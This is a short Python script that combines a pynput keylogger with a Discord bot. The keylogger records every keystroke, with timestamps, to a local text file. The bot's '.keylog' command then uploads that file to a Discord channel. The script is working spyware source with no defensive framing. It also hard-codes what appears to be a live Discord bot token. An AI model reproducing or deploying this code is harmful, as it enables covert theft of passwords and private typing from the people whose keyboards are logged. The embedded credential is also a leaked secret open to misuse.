from pynput import keyboard
import logging
import discord
from discord.ext import commands
import threading

def disBot():
    intents = discord.Intents.default()
    intents.message_content = True
    client = commands.Bot(command_prefix='.', intents=intents)

    @client.event
    async def on_ready():
        print("bot is ready, ha ha ha!!!!!")
        
    @client.command(pass_context=True)
    async def keylog(ctx):
        await ctx.send(file=discord.File("keyLogger.txt"))
    
    @client.command()
    async def hello(ctx):
        await ctx.send("hi from from first bot")  
        
    client.run('OTY0MDI0NjUwODIyNzIxNTY2.GtIVb7.8N3abwrXcAunSNx67lWqEBM27aSfvQRRoY6_dk')




def klogger():
    textDirectory = r"D:/keylogger with discord bot/"

    logging.basicConfig(filename=(textDirectory + "keyLogger.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

    def on_press(key):
        try:
            logging.info(key)
            print(key.char)
        except AttributeError:
            print(key)



    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()


    listener = keyboard.Listener(on_press=on_press)

    listener.start()
    
if __name__ == "__main__":
    t1 = threading.Thread(target=klogger)
    t2 = threading.Thread(target=disBot)
    
    t1.start()
    t2.start()
    
    t1.join()
    t2.join()
    
